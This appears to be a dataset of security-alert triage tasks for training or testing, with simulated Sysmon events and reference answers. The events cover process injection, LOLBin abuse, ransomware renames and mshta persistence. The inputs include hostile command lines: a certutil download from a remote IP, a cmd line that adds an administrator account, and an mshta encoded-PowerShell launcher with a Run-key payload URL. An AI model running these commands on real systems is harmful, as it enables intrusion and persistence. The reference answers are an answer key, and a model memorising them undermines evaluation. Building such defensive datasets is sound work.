@@ -1,0 +1,131 @@
+{
+  "train": [
+    {
+      "id": "task-edr-train-injection",
+      "instruction": "Triage the security alert 'ALT-INJ-8812'. Analyze the telemetry event to determine whether process injection occurred. Produce a structured JSON investigation report containing 'alert_id', 'verdict', 'mitre_attack_id', 'threat_actor_objective', 'lineage_verified', and 'remediation'.",
+      "input": {
+        "alert_id": "ALT-INJ-8812",
+        "event_id": 8,
+        "event_provider": "Microsoft-Windows-Sysmon",
+        "source_image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+        "source_pid": 4820,
+        "source_user": "CORP\\developer",
+        "target_image": "C:\\Windows\\System32\\svchost.exe",
+        "target_pid": 1044,
+        "target_user": "NT AUTHORITY\\SYSTEM",
+        "start_address": "0x00007FF8B2100000",
+        "memory_protection": "PAGE_EXECUTE_READWRITE",
+        "unbacked_memory": true,
+        "call_stack": "ntdll.dll!NtCreateThreadEx -> KERNELBASE.dll!CreateRemoteThreadEx"
+      },
+      "files": [],
+      "reference": {
+        "expected_verdict": "MALICIOUS",
+        "expected_mitre": "T1055",
+        "requires_lineage": true,
+        "requires_memory_protection_check": true,
+        "threat_class": "process_injection"
+      }
+    },
+    {
+      "id": "task-edr-train-lolbin",
+      "instruction": "Triage the security alert 'ALT-LOL-3104'. Analyze the suspicious process execution chain involving Living-off-the-Land Binaries (LOLBins). Produce a structured JSON report containing 'alert_id', 'verdict', 'mitre_attack_id', 'threat_actor_objective', 'lineage_verified', and 'remediation'.",
+      "input": {
+        "alert_id": "ALT-LOL-3104",
+        "event_id": 1,
+        "event_provider": "Microsoft-Windows-Sysmon",
+        "parent_image": "C:\\Windows\\System32\\certutil.exe",
+        "parent_command_line": "certutil.exe -urlcache -split -f http://198.51.100.22/stage1.bat C:\\Temp\\stage1.bat",
+        "image": "C:\\Windows\\System32\\cmd.exe",
+        "command_line": "cmd.exe /c net user /add eviladmin P@ssw0rd2026! && net localgroup administrators eviladmin /add",
+        "pid": 6192,
+        "user": "CORP\\sales01",
+        "integrity_level": "High"
+      },
+      "files": [],
+      "reference": {
+        "expected_verdict": "MALICIOUS",
+        "expected_mitre": "T1078",
+        "requires_lineage": true,
+        "requires_command_line_audit": true,
+        "threat_class": "account_creation_lolbin"
+      }
+    },
+    {
+      "id": "task-edr-train-vfs",
+      "instruction": "Triage the security alert 'ALT-VFS-9011'. Analyze the anomalous cloud storage virtual filesystem operations. Produce a structured JSON report containing 'alert_id', 'verdict', 'mitre_attack_id', 'threat_actor_objective', 'lineage_verified', and 'remediation'.",
+      "input": {
+        "alert_id": "ALT-VFS-9011",
+        "event_id": 11,
+        "event_provider": "Microsoft-Windows-Sysmon",
+        "image": "C:\\Users\\alice\\AppData\\Local\\Programs\\rclone\\rclone.exe",
+        "command_line": "rclone.exe mount remote-bucket: S: --vfs-cache-mode full",
+        "target_vfs_path": "S:\\Accounting\\Finances_2026.xlsx.locked",
+        "rename_rate_per_sec": 480,
+        "entropy_change": 7.92,
+        "original_extension": ".xlsx",
+        "new_extension": ".locked",
+        "pid": 7812,
+        "user": "CORP\\alice"
+      },
+      "files": [],
+      "reference": {
+        "expected_verdict": "MALICIOUS",
+        "expected_mitre": "T1486",
+        "requires_entropy_audit": true,
+        "threat_class": "ransomware_vfs"
+      }
+    }
+  ],
+  "validation": [
+    {
+      "id": "task-edr-val-injection-apc",
+      "instruction": "Triage the security alert 'ALT-VAL-APC-5501'. Analyze the process creation and APC queuing event. Produce a structured JSON report containing 'alert_id', 'verdict', 'mitre_attack_id', 'threat_actor_objective', 'lineage_verified', and 'remediation'.",
+      "input": {
+        "alert_id": "ALT-VAL-APC-5501",
+        "event_id": 7,
+        "event_provider": "Microsoft-Windows-Sysmon",
+        "parent_image": "C:\\Users\\Public\\updater.exe",
+        "parent_pid": 3310,
+        "target_image": "C:\\Windows\\System32\\notepad.exe",
+        "target_pid": 9840,
+        "creation_flags": "CREATE_SUSPENDED (0x00000004)",
+        "injected_thread_apc": true,
+        "apc_routine": "0x00007FFB30120000",
+        "memory_protection": "PAGE_EXECUTE_READWRITE",
+        "user": "CORP\\finance02"
+      },
+      "files": [],
+      "reference": {
+        "expected_verdict": "MALICIOUS",
+        "expected_mitre": "T1055",
+        "requires_lineage": true,
+        "requires_memory_protection_check": true,
+        "threat_class": "apc_injection"
+      }
+    },
+    {
+      "id": "task-edr-val-lolbin-mshta",
+      "instruction": "Triage the security alert 'ALT-VAL-MSH-7703'. Analyze the LOLBin script proxy execution and registry modification. Produce a structured JSON report containing 'alert_id', 'verdict', 'mitre_attack_id', 'threat_actor_objective', 'lineage_verified', and 'remediation'.",
+      "input": {
+        "alert_id": "ALT-VAL-MSH-7703",
+        "event_id": 13,
+        "event_provider": "Microsoft-Windows-Sysmon",
+        "image": "C:\\Windows\\System32\\mshta.exe",
+        "command_line": "mshta.exe vbscript:Close(Execute(\"CreateObject(\"\"WScript.Shell\"\").Run \"\"powershell -enc JAB3AGg...\"\",0\"))",
+        "registry_key": "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\OshoosiHealthCheck",
+        "registry_value": "C:\\Windows\\System32\\mshta.exe http://198.51.100.45/persist.hta",
+        "pid": 5420,
+        "user": "CORP\\ops03"
+      },
+      "files": [],
+      "reference": {
+        "expected_verdict": "MALICIOUS",
+        "expected_mitre": "T1218",
+        "requires_lineage": true,
+        "requires_command_line_audit": true,
+        "threat_class": "mshta_lolbin_persistence"
+      }
+    }
+  ]
+}
